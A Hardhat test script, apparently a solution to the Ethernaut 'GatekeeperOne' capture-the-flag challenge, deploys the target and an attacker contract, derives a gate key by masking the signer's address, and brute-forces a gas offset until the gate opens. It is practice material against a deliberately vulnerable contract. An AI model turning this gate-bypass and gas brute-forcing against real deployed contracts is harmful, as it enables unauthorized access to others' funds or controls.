import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'GatekeeperOne';
const CONTRACT_ADDRESS = '0xC3f85264A12dE94F8EA282d649a49d51d38D77b2';
const ATTACKER_NAME = 'GatekeeperOneAttacker';

describe(CONTRACT_NAME, () => {
  it('Solves the challenge', async () => {
    const [attacker] = await ethers.getSigners();
    console.log('my ADD: ', attacker.address);

    const contractFactory = await ethers.getContractFactory(CONTRACT_NAME);
    // const contract = contractFactory.attach(CONTRACT_ADDRESS);
    const contract = await contractFactory.deploy();
    await contract.deployed();

    const contractAttackerFactory = await ethers.getContractFactory(
      ATTACKER_NAME
    );
    const contractAttacker = await contractAttackerFactory.deploy(
      contract.address
    );
    await contractAttacker.deployed();
    console.log('Attacker ADD: ', contractAttacker.address);

    for (let i = 400; i < 8191; i++) {
      console.log(`Trying ${i}...`);
      try {
        const mask = '0xffffffff0000ffff';
        const shortAddress =
          '0x' +
          attacker.address.slice(
            attacker.address.length - 16,
            attacker.address.length
          );
        const gateKey = BigNumber.from(shortAddress).and(mask);

        const tx = await contractAttacker.enter(i, BigNumber.from(gateKey)); // 196
        await tx.wait();
        console.log(`Found value: ${i}`);
        break;
      } catch (err) {}
    }

    expect(await contract.entrant()).to.eq(attacker.address);
  });
});
